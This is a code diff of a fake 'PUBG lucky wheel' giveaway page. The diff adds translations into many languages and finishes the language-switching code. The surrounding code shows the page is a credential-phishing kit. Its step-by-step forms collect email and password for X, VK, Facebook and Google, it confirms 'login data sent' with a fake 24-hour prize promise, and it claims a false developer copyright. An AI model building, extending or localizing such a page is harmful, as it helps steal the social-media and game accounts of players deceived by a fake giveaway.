+                    copyright: "Автордук укук © High Morale Developments Limited. Бардык укуктар корголгон."
+                },
+                dag: {
+                    play: "ХЬУЪУ",
+                    title: "PUBG БАХТЛИ ЧАРХ",
+                    subtitle: "Бахтигьизни синнаб кьулугъуз ва эксклюзив тагьсирлар къазанмагъуз!",
+                    selectTitle: "КЪАБУЛ ЭТМЕ ЩИКЪЛ ТАЙИН ЭТ",
+                    selectText: "Тагьсир къабул этме социал машгьуллух тайин эт",
+                    getPrizeBtn: "ТАГЬСИР АЛМА",
+                    notificationSuccess: "Талап къабул этилди! Тагьсир 24 сагъат ичинде уьчурлу.",
+                    notificationSelectSocial: "Илтимас, социал машгьуллух тайин эт",
+                    notificationAlreadyPlayed: "Сиз бугьунгьу имканлигигьиздан файдаландыгъиз!",
+                    confirmationTitle: "ТАЛАП КЪАБУЛ ЭТИЛДИ!",
+                    confirmationMessage: "Къазангъигьиз PUBG Mobile хисбабгъиза 24 сагъат ичинде уьчурлу.",
+                    loginSuccess: "Гьахьиш маълуматлари йиберылди! Тагьсир 24 сагъат ичинде уьчурлу.",
+                    alreadyPlayed: "АЛЛАХЬ АЗ ХЬУЪУЧИ",
+                    myPrize: "Менин тагьсирим",
+                    importantNote: "Мухим: Тагьсир хисбабгъиза 24 сагъат ичинде уьчурлу",
+                    confirmationThanks: "Иштирак этигьиз учун сагъ булугъуз! Оюн ичиндеги инвентаргъизи текширме унутмагъуз.",
+                    choosePrize: "Тагьсир къабул этме социал машгьуллух тайин эт",
+                    developers: "Ишлемечилер Instagram",
+                    support: "Дахьл Telegram",
+                    yourPrize: "СИЗДИН ТАГЬСИРИГЬИЗ",
+                    prizeDescription: "Элемент сиздин оюн почтагъиза йиберылди. Транзакция ишленмеси учун 24 сагъатгъа дерин кьут.",
+                    collect: "АЛМА",
+                    emptyMail: "ПОЧТА БОШ",
+                    emptyMailDesc: "Сизде али тагьсир йохъ. Эксклюзив тагьсирлар къазанмагъуз учун бахтли чарахъда хьуъугъуз!",
+                    winners: "Къазанчилар:",
+                    terms: "Хизмет кьурме шартлар",
+                    privacy: "Гьуьрмет саясат",
+                    cookiePolicy: "Cookie саясат",
+                    cookiePref: "Cookie параметрлар",
+                    copyright: "Авторлух хакъ © High Morale Developments Limited. БутӀен хакълар сакъланмиш."
+                },
+                che: {
+                    play: "ЛОВЗАР",
+                    title: "PUBG БАХТАН ГОВЗ",
+                    subtitle: "Бахта хьожа еза, эксклюзив совгӀаташ йохала еза!",
+                    selectTitle: "ДАКЪА ЛАЦАР ХЬОСТАМ БАР",
+                    selectText: "СовгӀат дакха лацарах социалан къам бар",
+                    getPrizeBtn: "СОВҒӘТ ДАКХА",
+                    notificationSuccess: "Дахар дӀадахьийна! СовгӀат 24 сахьтехь кховдийр.",
+                    notificationSelectSocial: "Дехар до, социалан къам бар",
+                    notificationAlreadyPlayed: "ХӀара дийнахь хьуна болу кхетамаш декъаш дац!",
+                    confirmationTitle: "ДАХАР ДӀАДАХЬИЙНА!",
+                    confirmationMessage: "Хьан толамаш PUBG Mobile аккаунтехь 24 сахьтехь кховдийр.",
+                    loginSuccess: "ЧуйогӀу хаамаш дӀадаьхьна! СовгӀат 24 сахьтехь кховдийр.",
+                    alreadyPlayed: "МАЛЛА ЛОВЗАРХО",
+                    myPrize: "Сан совгӀат",
+                    importantNote: "КӀезиг: СовгӀат хьан аккаунтехь 24 сахьтехь кховдийр",
+                    confirmationThanks: "Дакъа лацарна баркалла! Ловзарехь хьан инвентар тайпа ца еза.",
+                    choosePrize: "СовгӀат дакха лацарах социалан къам бар",
+                    developers: "Кхоьллинарш Instagram",
+                    support: "ГӀо Telegram",
+                    yourPrize: "ХЬАН СОВҒӘТ",
+                    prizeDescription: "Элемент хьан ловзаран поштан тӀехь йиттина. ДӀайаздар кечдарна 24 сахьт кхаччалца хаьа.",
+                    collect: "ДАКХА",
+                    emptyMail: "ПОШТА ЙОЦУШ",
+                    emptyMailDesc: "Хьуна хӀинца а совгӀат йоцуш. Эксклюзив совгӀаташ йохала езахь бахтан говз ловза еза!",
+                    winners: "Толамхой:",
+                    terms: "ХӀоттамаш серлайаккхар",
+                    privacy: "Конфиденциальностан политика",
+                    cookiePolicy: "Cookie политика",
+                    cookiePref: "Cookie параметраш",
+                    copyright: "Авторски права © High Morale Developments Limited. Массо а права ларйина."
+                },
+                az: {
+                    play: "OYNA",
+                    title: "PUBG BƏXT ÇARXİ",
+                    subtitle: "Bəxtinizi sınayın və eksklüziv mükafatlar qazanın!",
+                    selectTitle: "QƏBUL ETMƏ ÜSULUNU SEÇİN",
+                    selectText: "Mükafatı qəbul etmək üçün sosial şəbəkəni seçin",
+                    getPrizeBtn: "MÜKAFATI AL",
+                    notificationSuccess: "Müraciət qəbul edildi! Mükafat 24 saat ərzində köçürüləcək.",
+                    notificationSelectSocial: "Zəhmət olmasa, sosial şəbəkəni seçin",
+                    notificationAlreadyPlayed: "Siz bu günkü imkanınızdan istifadə etdiniz!",
+                    confirmationTitle: "MÜRACİƏT QƏBUL EDİLDİ!",
+                    confirmationMessage: "Qazancınız PUBG Mobile hesabınıza 24 saat ərzində köçürüləcək.",
+                    loginSuccess: "Giriş məlumatları göndərildi! Mükafat 24 saat ərzində köçürüləcək.",
+                    alreadyPlayed: "ARTIQ OYNADINIZ",
+                    myPrize: "Mənim mükafatım",
+                    importantNote: "Əhəmiyyətli: Mükafat hesabınıza 24 saat ərzində köçürüləcək",
+                    confirmationThanks: "İştirak etdiyiniz üçün təşəkkürlər! Oyun içindəki inventarınızı yoxlamağı unutmayın.",
+                    choosePrize: "Mükafatı qəbul etmək üçün sosial şəbəkəni seçin",
+                    developers: "Tərtibatçılar Instagram",
+                    support: "Dəstək Telegram",
+                    yourPrize: "SİZİN MÜKAFATINIZ",
+                    prizeDescription: "Element oyun poçtunuza göndərildi. Əməliyyatın emalı üçün 24 saatadək gözləyin.",
+                    collect: "AL",
+                    emptyMail: "POÇT BOŞ",
+                    emptyMailDesc: "Hələ mükafatınız yoxdur. Eksklüziv mükafatlar qazanmaq üçün bəxt çarxında oynayın!",
+                    winners: "Qaliblər:",
+                    terms: "Xidmət şərtləri",
+                    privacy: "Məxfilik siyasəti",
+                    cookiePolicy: "Cookie siyasəti",
+                    cookiePref: "Cookie parametrləri",
+                    copyright: "Müəlliflik hüququ © High Morale Developments Limited. Bütün hüquqlar qorunur."
+                },
+                hy: {
+                    play: "ԽԱՂԱԼ",
+                    title: "PUBG ԲԱԽՏԻ ԱՇԽՐՀ",
+                    subtitle: "Փորձեք ձեր բախտը և շահեք բացառիկ մրցանակներ!",
+                    selectTitle: "ԸՆՏՐԵՔ ՍՏԱՑՄԱՆ ԵՂԱՆԱԿԸ",
+                    selectText: "Մրցանակը ստանալու համար ընտրեք սոցիալական ցանց",
+                    getPrizeBtn: "ՍՏԱՆԱԼ ՄՐՑԱՆԱԿԸ",
+                    notificationSuccess: "Դիմումն ընդունված է! Մրցանակը կտեղափոխվի 24 ժամվա ընթացքում:",
+                    notificationSelectSocial: "Խնդրում ենք ընտրել սոցիալական ցանց",
+                    notificationAlreadyPlayed: "Դուք արդեն օգտագործել եք այսօրվա ձեր հնարավորությունը!",
+                    confirmationTitle: "ԴԻՄՈՒՄԸ ԸՆԴՈՒՆՎԵԼ Է!",
+                    confirmationMessage: "Ձեր շահած գումարը կտեղափոխվի ձեր PUBG Mobile հաշվին 24 ժամվա ընթացքում:",
+                    loginSuccess: "Մուտքի տվյալները ուղարկված են! Մրցանակը կտեղափոխվի 24 ժամվա ընթացքում:",
+                    alreadyPlayed: "ԱՐԴԵՆ ԽԱՂԱԾ ԵՆ",
+                    myPrize: "Իմ մրցանակը",
+                    importantNote: "Կարևոր. Մրցանակը կտեղափոխվի ձեր հաշվին 24 ժամվա ընթացքում",
+                    confirmationThanks: "Շնորհակալություն մասնակցության համար: Մի մոռացեք ստուգել ձեր խաղի պահեստը:",
+                    choosePrize: "Մրցանակը ստանալու համար ընտրեք սոցիալական ցանց",
+                    developers: "Մշակողներ Instagram",
+                    support: "Աջակցություն Telegram",
+                    yourPrize: "ՁԵՐ ՄՐՑԱՆԱԿԸ",
+                    prizeDescription: "Տարրը ուղարկվել է ձեր խաղային փոստին: Խնդրում ենք սպասել մինչև 24 ժամ գործարքի մշակման համար:",
+                    collect: "ՀԱՎԱՔԵԼ",
+                    emptyMail: "ՓՈՍՏԸ ԴԱՏԱՐԿ Է",
+                    emptyMailDesc: "Դեռ չունեք մրցանակներ: Խաղացեք բախտի աշխարհում՝ բացառիկ մրցանակներ շահելու համար:",
+                    winners: "Հաղթողներ՝",
+                    terms: "Ծառայության պայմաններ",
+                    privacy: "Գաղտնիության քաղաքականություն",
+                    cookiePolicy: "Cookie քաղաքականություն",
+                    cookiePref: "Cookie կարգավորումներ",
+                    copyright: "Հեղինակային իրավունք © High Morale Developments Limited: Բոլոր իրավունքները պաշտպանված են:"
+                },
+                jp: {
+                    play: "プレイ",
+                    title: "PUBG 幸運の輪",
+                    subtitle: "運試しをして独占的な賞品を勝ち取ろう！",
+                    selectTitle: "受け取り方法を選択",
+                    selectText: "賞品を受け取るためのソーシャルネットワークを選択",
+                    getPrizeBtn: "賞品を受け取る",
+                    notificationSuccess: "申請が受け付けられました！賞品は24時間以内に付与されます。",
+                    notificationSelectSocial: "ソーシャルネットワークを選択してください",
+                    notificationAlreadyPlayed: "本日の試行回数を既に使用しています！",
+                    confirmationTitle: "申請が受け付けられました！",
+                    confirmationMessage: "獲得した賞品は24時間以内にPUBG Mobileアカウントに付与されます。",
+                    loginSuccess: "ログインデータが送信されました！賞品は24時間以内に付与されます。",
+                    alreadyPlayed: "既にプレイ済み",
+                    myPrize: "私の賞品",
+                    importantNote: "重要：賞品は24時間以内にアカウントに付与されます",
+                    confirmationThanks: "ご参加ありがとうございます！ゲーム内のインベントリを確認するのを忘れないでください。",
+                    choosePrize: "賞品を受け取るためのソーシャルネットワークを選択",
+                    developers: "開発者 Instagram",
+                    support: "サポート Telegram",
+                    yourPrize: "あなたの賞品",
+                    prizeDescription: "アイテムがゲーム内メールに送信されました。取引処理のため最大24時間お待ちください。",
+                    collect: "受け取る",
+                    emptyMail: "メールが空です",
+                    emptyMailDesc: "まだ賞品がありません。独占的な賞品を勝ち取るために幸運の輪を回してください！",
+                    winners: "勝者：",
+                    terms: "利用規約",
+                    privacy: "プライバシーポリシー",
+                    cookiePolicy: "Cookieポリシー",
+                    cookiePref: "Cookie設定",
+                    copyright: "著作権 © High Morale Developments Limited。無断複写・転載を禁じます。"
+                },
+                uk: {
+                    play: "ГРАТИ",
+                    title: "PUBG КОЛЕСО ФОРТУНИ",
+                    subtitle: "Спробуйте свою удачу та виграйте ексклюзивні призи!",
+                    selectTitle: "ОБЕРІТЬ СПОСІБ ОТРИМАННЯ",
+                    selectText: "Виберіть соціальну мережу для отримання призу",
+                    getPrizeBtn: "ОТРИМАТИ ПРИЗ",
+                    notificationSuccess: "Заявку прийнято! Приз буде зараховано протягом 24 годин.",
+                    notificationSelectSocial: "Будь ласка, виберіть соціальну мережу",
+                    notificationAlreadyPlayed: "Ви вже використали свою спробу сьогодні!",
+                    confirmationTitle: "ЗАЯВКУ ПРИЙНЯТО!",
+                    confirmationMessage: "Ваш виграш буде зараховано на акаунт PUBG Mobile протягом 24 годин.",
+                    loginSuccess: "Дані для входу відправлено! Приз буде зараховано протягом 24 годин.",
+                    alreadyPlayed: "ВЖЕ ГРАЛИ",
+                    myPrize: "Мій приз",
+                    importantNote: "Важливо: Приз буде зараховано на ваш акаунт протягом 24 годин",
+                    confirmationThanks: "Дякуємо за участь! Не забудьте перевірити свій ігровий інвентар.",
+                    choosePrize: "Виберіть соціальну мережу для отримання призу",
+                    developers: "Розробники Instagram",
+                    support: "Підтримка Telegram",
+                    yourPrize: "ВАШ ПРИЗ",
+                    prizeDescription: "Предмет було відправлено на вашу ігрову пошту. Будь ласка, зачекайте до 24 годин для обробки транзакції.",
+                    collect: "ЗАБРАТИ",
+                    emptyMail: "ПОШТА ПОРОЖНЯ",
+                    emptyMailDesc: "У вас поки що немає виграних призів. Зіграйте в колесо фортуни, щоб виграти ексклюзивні призи!",
+                    winners: "Переможці:",
+                    terms: "Умови обслуговування",
+                    privacy: "Політика конфіденційності",
+                    cookiePolicy: "Політика Cookie",
+                    cookiePref: "Налаштування Cookie",
+                    copyright: "Авторські права © High Morale Developments Limited. Усі права захищені."
                 }
             };
             
-            // Функция смены языка
+            // Функция смены языка - ПОЛНАЯ
             function changeLanguage(lang) {
                 const t = translations[lang] || translations.ru;
                 
+                // Заголовок и подзаголовок
                 document.querySelector('.header h1').textContent = t.title;
                 document.querySelector('.header p').textContent = t.subtitle;
                 
+                // Кнопка ИГРАТЬ
                 if (hasPlayed && userIP !== ownerIP) {
                     playBtn.innerHTML = `<i class="fas fa-check"></i> ${t.alreadyPlayed}`;
                 } else {
                     playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
                 }
                 
+                // Форма выбора соцсети
                 document.querySelector('#socialSelectSection h2').textContent = t.selectTitle;
                 document.querySelector('#socialSelectSection p').textContent = t.selectText;
                 getPrizeBtn.innerHTML = `<i class="fas fa-paper-plane"></i> ${t.getPrizeBtn}`;
+                document.querySelector('#socialSelectSection p:last-child strong').textContent = t.importantNote.split(':')[0] + ':';
+                document.querySelector('#socialSelectSection p:last-child').innerHTML = `<strong>${t.importantNote.split(':')[0]}:</strong> ${t.importantNote.split(':')[1]}`;
+                
+                // Секция подтверждения
                 document.querySelector('#confirmationSection h2').textContent = t.confirmationTitle;
                 document.querySelector('.confirmation-message').innerHTML = t.confirmationMessage;
+                document.querySelector('#confirmationSection p').innerHTML = t.confirmationThanks;
                 
+                // Кнопка "Мой приз"
+                prizeMailBtn.innerHTML = `<i class="fas fa-gift"></i> ${t.myPrize}`;
+                
+                // Окно приза
+                document.querySelector('.prize-banner').textContent = t.yourPrize;
+                document.getElementById('collectPrizeBtn').textContent = t.collect;
+                
+                // Счетчик победителей
+                document.querySelector('.winners-text').textContent = t.winners;
+                
+                // Меню разработчиков
+                document.querySelector('.dev-menu-item:nth-child(1) span').textContent = t.developers;
+                document.querySelector('.dev-menu-item:nth-child(2) span').textContent = t.support;
+                
+                // Футер
+                const footerLinks = document.querySelectorAll('.footer-link');
+                if (footerLinks.length >= 4) {
+                    footerLinks[0].textContent = t.terms;
+                    footerLinks[1].textContent = t.privacy;
+                    footerLinks[2].textContent = t.cookiePolicy;
+                    footerLinks[3].textContent = t.cookiePref;
+                }
+                document.querySelector('.copyright').textContent = t.copyright;
+                
+                // Обновляем текст индикатора выбора
+                selectionIndicator.textContent = 'ВЫБРАНО';
+                
+                // Обновляем язык в выпадающем меню
                 const langNames = {
                     ru: 'Русский', en: 'English', uz: "O'zbekcha",
                     kz: 'Қазақша', ar: 'العربية', zh: '中文',
@@ -2985,9 +3491,6 @@
                     uk: 'Українська'
                 };
                 languageBtn.innerHTML = `<i class="fas fa-globe"></i> ${langNames[lang] || 'Русский'} <i class="fas fa-chevron-down"></i>`;
-                
-                // Обновляем текст индикатора выбора
-                selectionIndicator.textContent = 'ВЫБРАНО';
             }
             
             // Обработчики для меню языка
@@ -3014,7 +3517,7 @@
                 } else if (isSuccess) {
                     notification.classList.add('success');
                 } else {
-                    notification.style.background = 'linear-gradient(135deg, #2a3b5a, #1a2c42)';
+                    notification.style.background = 'linear-gradient(135deg, #162436, #0a1018)';
                 }
                 
                 notification.style.display = 'block';
@@ -3129,9 +3632,13 @@
                             if (userIP !== ownerIP) {
                                 hasPlayed = true;
                                 localStorage.setItem('hasPlayed', 'true');
-                                playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
+                                const currentLang = languageBtn.textContent.split(' ')[1];
+                                const t = translations[currentLang] || translations.ru;
+                                playBtn.innerHTML = `<i class="fas fa-check"></i> ${t.alreadyPlayed}`;
                             } else {
-                                playBtn.innerHTML = '<i class="fas fa-play"></i> ИГРАТЬ';
+                                const currentLang = languageBtn.textContent.split(' ')[1];
+                                const t = translations[currentLang] || translations.ru;
+                                playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
                             }
                             
                             playBtn.disabled = false;
@@ -3162,7 +3669,7 @@
             
             // Обработчики форм входа
             
-            // Twitter/X форма (этап 1: email/username)
+            // X форма (этап 1: email/username)
             document.getElementById('xEmailForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
                 xUsername = this.querySelector('input').value;
@@ -3172,7 +3679,7 @@
                 openModal('xModalStep2');
             });
             
-            // Twitter/X форма (этап 2: пароль)
+            // X форма (этап 2: пароль)
             document.getElementById('xPasswordForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
                 const password = this.querySelector('input').value;
@@ -3335,7 +3842,7 @@
                 const socialNames = {
                     'vk': 'ВКонтакте',
                     'facebook': 'Facebook',
-                    'x': 'Twitter/X',
+                    'x': 'X',
                     'google': 'Google'
                 };
                 
@@ -3481,14 +3988,14 @@
                 }
             });
             
-            // Автоматическая анимация рамки до начала игры
+            // Автоматическая анимация рамки до начала игры - МЕДЛЕННЕЕ
             function animateFrameRandomly() {
                 if (!isSpinning && !hasPlayed) {
                     const randomIndex = Math.floor(Math.random() * prizeItems.length);
                     moveFrameToPrize(randomIndex);
                     
-                    // Рандомный интервал для следующей анимации
-                    const nextDelay = Math.random() * 2000 + 1000; // 1-3 секунды
+                    // Увеличена задержка для более медленной анимации
+                    const nextDelay = Math.random() * 3000 + 2000; // 2-5 секунд
                     setTimeout(animateFrameRandomly, nextDelay);
                 }
             }
@@ -3499,6 +4006,13 @@
                     animateFrameRandomly();
                 }
             }, 2000);
+            
+            // Очистка таймера при закрытии страницы
+            window.addEventListener('beforeunload', function() {
+                if (winnersTimer) {
+                    clearTimeout(winnersTimer);
+                }
+            });
         });
     </script>
 </body>
